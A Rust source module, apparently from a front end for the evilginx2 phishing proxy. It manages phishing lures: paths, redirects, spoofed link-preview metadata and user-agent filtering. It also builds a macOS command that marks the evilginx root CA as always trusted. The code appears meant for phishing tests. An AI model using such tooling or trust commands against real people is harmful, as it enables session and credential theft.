use std::fs;

use rusqlite::{params, Connection, OptionalExtension};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use uuid::Uuid;

use crate::db::{self, now_iso};
use crate::error::{AppError, AppResult};
use crate::kit::kit_root;

#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct LureOps {
    #[serde(default)]
    pub redirect_url: String,
    #[serde(default)]
    pub og_title: String,
    #[serde(default)]
    pub og_desc: String,
    #[serde(default)]
    pub og_image: String,
    #[serde(default)]
    pub og_url: String,
    #[serde(default)]
    pub ua_filter: String,
    #[serde(default)]
    pub redirector: String,
    /// Primary lure path (e.g. `/AbCdEf`). Empty = keep/reuse existing.
    #[serde(default)]
    pub path: String,
    /// Additional lure paths (multi-lure / cohort links).
    #[serde(default)]
    pub extra_paths: Vec<String>,
    #[serde(default)]
    pub paused: bool,
    /// Force a new random primary path on next start.
    #[serde(default)]
    pub regenerate_path: bool,
}

impl LureOps {
    pub fn from_auth_meta(meta: &Value) -> Self {
        meta.get("lure_ops")
            .cloned()
            .and_then(|v| serde_json::from_value(v).ok())
            .unwrap_or_default()
    }

    pub fn merge_into_auth_meta(&self, meta: &mut Value) {
        if !meta.is_object() {
            *meta = json!({});
        }
        if let Some(obj) = meta.as_object_mut() {
            let mut clean = self.clone();
            clean.regenerate_path = false;
            obj.insert(
                "lure_ops".into(),
                serde_json::to_value(&clean).unwrap_or(json!({})),
            );
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Lure {
    pub id: String,
    pub profile_id: String,
    pub name: String,
    pub path: String,
    pub lure_url: String,
    pub redirect_url: String,
    pub redirector: String,
    pub ua_filter: String,
    pub og_title: String,
    pub og_desc: String,
    pub og_image: String,
    pub og_url: String,
    pub paused: bool,
    pub is_default: bool,
    pub created_at: String,
    pub updated_at: String,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct UpsertLure {
    pub id: Option<String>,
    pub profile_id: String,
    pub name: String,
    pub path: Option<String>,
    pub lure_url: Option<String>,
    pub redirect_url: Option<String>,
    pub redirector: Option<String>,
    pub ua_filter: Option<String>,
    pub og_title: Option<String>,
    pub og_desc: Option<String>,
    pub og_image: Option<String>,
    pub og_url: Option<String>,
    pub paused: Option<bool>,
    pub is_default: Option<bool>,
}

fn row_to_lure(row: &rusqlite::Row<'_>) -> rusqlite::Result<Lure> {
    Ok(Lure {
        id: row.get("id")?,
        profile_id: row.get("profile_id")?,
        name: row.get("name")?,
        path: row.get("path")?,
        lure_url: row.get("lure_url")?,
        redirect_url: row.get("redirect_url")?,
        redirector: row.get("redirector")?,
        ua_filter: row.get("ua_filter")?,
        og_title: row.get("og_title")?,
        og_desc: row.get("og_desc")?,
        og_image: row.get("og_image")?,
        og_url: row.get("og_url")?,
        paused: row.get::<_, i64>("paused")? != 0,
        is_default: row.get::<_, i64>("is_default")? != 0,
        created_at: row.get("created_at")?,
        updated_at: row.get("updated_at")?,
    })
}

const LURE_SELECT: &str = "SELECT id, profile_id, name, path, lure_url, redirect_url, redirector,
    ua_filter, og_title, og_desc, og_image, og_url, paused, is_default, created_at, updated_at";

pub fn list_lures(profile_id: &str) -> AppResult<Vec<Lure>> {
    db::with_db(|conn| {
        let sql = format!(
            "{LURE_SELECT} FROM lures WHERE profile_id = ?1 ORDER BY is_default DESC, name"
        );
        let mut stmt = conn.prepare(&sql)?;
        let rows = stmt.query_map(params![profile_id], row_to_lure)?;
        Ok(rows.filter_map(|r| r.ok()).collect())
    })
}

pub fn get_lure(id: &str) -> AppResult<Option<Lure>> {
    db::with_db(|conn| {
        let sql = format!("{LURE_SELECT} FROM lures WHERE id = ?1");
        let mut stmt = conn.prepare(&sql)?;
        let lure = stmt.query_row(params![id], row_to_lure).optional()?;
        Ok(lure)
    })
}

pub fn get_default_lure(profile_id: &str) -> AppResult<Option<Lure>> {
    db::with_db(|conn| {
        let sql =
            format!("{LURE_SELECT} FROM lures WHERE profile_id = ?1 AND is_default = 1 LIMIT 1");
        let mut stmt = conn.prepare(&sql)?;
        let lure = stmt
            .query_row(params![profile_id], row_to_lure)
            .optional()?;
        Ok(lure)
    })
}

pub fn upsert_lure(req: UpsertLure) -> AppResult<Lure> {
    let id = req
        .id
        .clone()
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| Uuid::new_v4().to_string());
    let now = now_iso();
    db::with_db(|conn| {
        let created: String = conn
            .query_row(
                "SELECT created_at FROM lures WHERE id = ?1",
                params![id],
                |r| r.get(0),
            )
            .optional()?
            .unwrap_or_else(|| now.clone());

        let is_default = req.is_default.unwrap_or(false);
        if is_default {
            conn.execute(
                "UPDATE lures SET is_default = 0 WHERE profile_id = ?1",
                params![req.profile_id],
            )?;
        }

        conn.execute(
            "INSERT INTO lures(id, profile_id, name, path, lure_url, redirect_url, redirector,
                                ua_filter, og_title, og_desc, og_image, og_url, paused, is_default,
                                created_at, updated_at)
             VALUES(?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14,?15,?16)
             ON CONFLICT(id) DO UPDATE SET
               name=excluded.name,
               path=excluded.path,
               lure_url=excluded.lure_url,
               redirect_url=excluded.redirect_url,
               redirector=excluded.redirector,
               ua_filter=excluded.ua_filter,
               og_title=excluded.og_title,
               og_desc=excluded.og_desc,
               og_image=excluded.og_image,
               og_url=excluded.og_url,
               paused=excluded.paused,
               is_default=excluded.is_default,
               updated_at=excluded.updated_at",
            params![
                id,
                req.profile_id,
                req.name,
                req.path.unwrap_or_default(),
                req.lure_url.unwrap_or_default(),
                req.redirect_url.unwrap_or_default(),
                req.redirector.unwrap_or_default(),
                req.ua_filter.unwrap_or_default(),
                req.og_title.unwrap_or_default(),
                req.og_desc.unwrap_or_default(),
                req.og_image.unwrap_or_default(),
                req.og_url.unwrap_or_default(),
                if req.paused.unwrap_or(false) { 1 } else { 0 },
                if is_default { 1 } else { 0 },
                created,
                now,
            ],
        )?;
        Ok(())
    })?;
    get_lure(&id)?.ok_or_else(|| AppError::msg("lure missing after upsert"))
}

pub fn delete_lure(id: &str) -> AppResult<()> {
    db::with_db(|conn| {
        let in_use: bool = conn
            .query_row(
                "SELECT 1 FROM campaigns WHERE lure_id = ?1 LIMIT 1",
                params![id],
                |_| Ok(true),
            )
            .optional()?
            .unwrap_or(false);
        if in_use {
            return Err(AppError::msg("lure is referenced by a campaign"));
        }
        conn.execute("DELETE FROM lures WHERE id = ?1", params![id])?;
        Ok(())
    })
}

pub fn set_default_lure(profile_id: &str, lure_id: &str) -> AppResult<Lure> {
    db::with_db(|conn| {
        conn.execute(
            "UPDATE lures SET is_default = 0 WHERE profile_id = ?1",
            params![profile_id],
        )?;
        conn.execute(
            "UPDATE lures SET is_default = 1, updated_at = ?1 WHERE id = ?2 AND profile_id = ?3",
            params![now_iso(), lure_id, profile_id],
        )?;
        Ok(())
    })?;
    get_lure(lure_id)?.ok_or_else(|| AppError::msg("lure not found"))
}

pub fn lure_ops_from_lure(lure: &Lure) -> LureOps {
    LureOps {
        redirect_url: lure.redirect_url.clone(),
        og_title: lure.og_title.clone(),
        og_desc: lure.og_desc.clone(),
        og_image: lure.og_image.clone(),
        og_url: lure.og_url.clone(),
        ua_filter: lure.ua_filter.clone(),
        redirector: lure.redirector.clone(),
        path: lure.path.clone(),
        extra_paths: vec![],
        paused: lure.paused,
        regenerate_path: false,
    }
}

pub fn lures_as_ops_list(profile_id: &str) -> AppResult<Vec<LureOps>> {
    let lures = list_lures(profile_id)?;
    Ok(lures.iter().map(lure_ops_from_lure).collect())
}

pub fn update_lure_url(lure_id: &str, lure_url: &str, path: Option<&str>) -> AppResult<()> {
    let now = now_iso();
    db::with_db(|conn| {
        if let Some(p) = path.filter(|s| !s.is_empty()) {
            conn.execute(
                "UPDATE lures SET lure_url = ?1, path = ?2, updated_at = ?3 WHERE id = ?4",
                params![lure_url, p, now, lure_id],
            )?;
        } else {
            conn.execute(
                "UPDATE lures SET lure_url = ?1, updated_at = ?2 WHERE id = ?3",
                params![lure_url, now, lure_id],
            )?;
        }
        Ok(())
    })
}

fn path_from_lure_url(url: &str) -> String {
    url::Url::parse(url)
        .ok()
        .map(|u| u.path().to_string())
        .filter(|p| !p.is_empty() && p != "/")
        .unwrap_or_default()
}

pub(crate) fn migrate_v8_lures(conn: &Connection) -> AppResult<()> {
    let mut stmt = conn.prepare("SELECT id, lure_url, auth_meta FROM profiles")?;
    let profiles: Vec<(String, String, String)> = stmt
        .query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))?
        .filter_map(|r| r.ok())
        .collect();

    for (profile_id, lure_url, auth_meta_s) in profiles {
        let has_lures: bool = conn
            .query_row(
                "SELECT 1 FROM lures WHERE profile_id = ?1 LIMIT 1",
                params![profile_id],
                |_| Ok(true),
            )
            .optional()?
            .unwrap_or(false);
        if has_lures {
            continue;
        }

        let auth_meta: Value =
            serde_json::from_str(&auth_meta_s).unwrap_or(Value::Object(Default::default()));
        let ops = LureOps::from_auth_meta(&auth_meta);
        let has_legacy = !lure_url.is_empty() || ops != LureOps::default();

        if !has_legacy {
            continue;
        }

        let now = now_iso();
        let default_id = Uuid::new_v4().to_string();
        let path = if !ops.path.is_empty() {
            ops.path.clone()
        } else {
            path_from_lure_url(&lure_url)
        };

        conn.execute(
            "INSERT INTO lures(id, profile_id, name, path, lure_url, redirect_url, redirector,
                                ua_filter, og_title, og_desc, og_image, og_url, paused, is_default,
                                created_at, updated_at)
             VALUES(?1,?2,'Default',?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14,?15)",
            params![
                default_id,
                profile_id,
                path,
                lure_url,
                ops.redirect_url,
                ops.redirector,
                ops.ua_filter,
                ops.og_title,
                ops.og_desc,
                ops.og_image,
                ops.og_url,
                if ops.paused { 1 } else { 0 },
                1,
                now,
                now,
            ],
        )?;

        for extra in &ops.extra_paths {
            if extra.is_empty() {
                continue;
            }
            let extra_id = Uuid::new_v4().to_string();
            conn.execute(
                "INSERT INTO lures(id, profile_id, name, path, lure_url, redirect_url, redirector,
                                    ua_filter, og_title, og_desc, og_image, og_url, paused, is_default,
                                    created_at, updated_at)
                 VALUES(?1,?2,?3,?4,'',?5,?6,?7,?8,?9,?10,?11,?12,0,?13,?14)",
                params![
                    extra_id,
                    profile_id,
                    format!("Legacy path {extra}"),
                    extra,
                    ops.redirect_url,
                    ops.redirector,
                    ops.ua_filter,
                    ops.og_title,
                    ops.og_desc,
                    ops.og_image,
                    ops.og_url,
                    if ops.paused { 1 } else { 0 },
                    now,
                    now,
                ],
            )?;
        }
    }
    Ok(())
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RedirectorInfo {
    pub id: String,
    pub path: String,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CaTrustInfo {
    pub ca_cert_path: String,
    pub exists: bool,
    /// Already present in a macOS keychain (often System).
    pub already_installed: bool,
    pub macos_command: String,
    pub notes: Vec<String>,
    pub steps: Vec<String>,
}

fn ca_already_installed() -> bool {
    let out = std::process::Command::new("security")
        .args([
            "find-certificate",
            "-c",
            "Evilginx Super-Evil Root CA",
            "-a",
        ])
        .output();
    match out {
        Ok(o) => String::from_utf8_lossy(&o.stdout).contains("Evilginx Super-Evil Root CA"),
        Err(_) => false,
    }
}

pub fn list_redirectors() -> AppResult<Vec<RedirectorInfo>> {
    let root = kit_root()?;
    let dir = root.join("vendor/evilginx2/redirectors");
    if !dir.is_dir() {
        return Ok(vec![]);
    }
    let mut out = Vec::new();
    for entry in fs::read_dir(&dir)? {
        let entry = entry?;
        if !entry.file_type()?.is_dir() {
            continue;
        }
        let name = entry.file_name().to_string_lossy().to_string();
        if name.starts_with('.') {
            continue;
        }
        let index = entry.path().join("index.html");
        if index.is_file() {
            out.push(RedirectorInfo {
                id: name,
                path: entry.path().display().to_string(),
            });
        }
    }
    out.sort_by(|a, b| a.id.cmp(&b.id));
    Ok(out)
}

pub fn ca_trust_info() -> AppResult<CaTrustInfo> {
    let root = kit_root()?;
    let ca = root.join("kit/evilginx/run/data/crt/ca.crt");
    let path = ca.display().to_string();
    let installed = ca_already_installed();
    // Prefer login keychain — double-click / System re-import often fails with -25294
    // when the cert already exists (errSecInvalidOwnerEdit).
    let cmd = if installed {
        format!(
            "sudo security add-trusted-cert -d -r trustRoot -p ssl -k /Library/Keychains/System.keychain \"{}\"",
            path
        )
    } else {
        format!(
            "security add-trusted-cert -r trustRoot -p ssl -k \"$HOME/Library/Keychains/login.keychain-db\" \"{}\"",
            path
        )
    };
    let steps = if installed {
        vec![
            "The CA is already in Keychain Access — do not import the .crt again (Error -25294).".into(),
            "Open Keychain Access → System (or login) → Certificates → “Evilginx Super-Evil Root CA”.".into(),
            "Double-click the cert → expand Trust → “When using this certificate” → Always Trust → close (enter password).".into(),
            "Quit and reopen the browser (or use a fresh profile), then reload the lure.".into(),
        ]
    } else {
        vec![
            "Prefer: run the trust command below in Terminal (approve the password prompt).".into(),
            "Or: Keychain Access → File → Import Items… → pick ca.crt → login keychain.".into(),
            "Then double-click the cert → Trust → Always Trust.".into(),
            "Do not rely on double-clicking the .crt alone on newer macOS — System re-import often fails.".into(),
        ]
    };
    Ok(CaTrustInfo {
        ca_cert_path: path,
        exists: ca.is_file(),
        already_installed: installed,
        macos_command: cmd,
        notes: vec![
            "Required so browsers trust evilginx's locally issued HTTPS certs.".into(),
            "Error -25294 usually means the CA is already installed — set Always Trust on the existing entry instead of re-importing.".into(),
            "If you restarted evilginx mid-test, clear site cookies for the dry-run domain — stale session cookies are ignored.".into(),
        ],
        steps,
    })
}

pub fn open_ca_cert() -> AppResult<String> {
    let info = ca_trust_info()?;
    if !info.exists {
        return Err(AppError::msg(
            "CA cert not found yet — start the proxy once so evilginx can mint it",
        ));
    }
    // Opening Keychain Access to the cert list is clearer than double-click import.
    let _ = std::process::Command::new("open")
        .args(["-a", "Keychain Access"])
        .status();
    let status = std::process::Command::new("open")
        .args(["-R", &info.ca_cert_path])
        .status()
        .map_err(|e| AppError::msg(format!("open failed: {e}")))?;
    if !status.success() {
        // Fallback: reveal path only
        let _ = std::process::Command::new("open")
            .arg(
                std::path::Path::new(&info.ca_cert_path)
                    .parent()
                    .unwrap_or(std::path::Path::new("/")),
            )
            .status();
    }
    Ok(info.ca_cert_path)
}
